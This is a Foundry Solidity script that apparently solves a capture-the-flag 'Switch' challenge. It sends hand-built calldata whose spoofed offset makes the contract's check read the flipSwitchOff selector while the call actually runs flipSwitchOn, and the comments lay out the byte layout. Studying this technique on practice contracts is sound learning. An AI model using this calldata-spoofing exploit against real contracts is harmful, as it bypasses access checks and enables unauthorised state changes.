// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Switch} from "../src/Switch.sol";
import {Script, console} from "forge-std/script.sol";

contract SwitchSolution is Script {
    Switch switchInstance = Switch(0x2db78d2690bE87887475Be558013c58c4041D881);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        /* 
        flipSwitch sig =                  30c13ade       from 0x0 to 0x4
        offset for the data field         0000000000000000000000000000000000000000000000000000000000000060   from 0x4 to 0x24
        empty stuff to get to 64 bytes    0000000000000000000000000000000000000000000000000000000000000000   from 0x24 to 0x44
        flipSwitchOff sig = 0x            20606e1500000000000000000000000000000000000000000000000000000000   from 0x44 to 0x64
        length of data                    0000000000000000000000000000000000000000000000000000000000000004   from 0x64 to 0x84

        flipSwitchOn sig = 0x             76227e1200000000000000000000000000000000000000000000000000000000   from 0x84 to 0x104




        */

        bytes memory callData =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        // bytes memory callData =
        //     hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        address(switchInstance).call(callData);

        bool stateSwitch = switchInstance.switchOn();
        console.log("The switch is : ", stateSwitch);
        vm.stopBroadcast();
    }
}
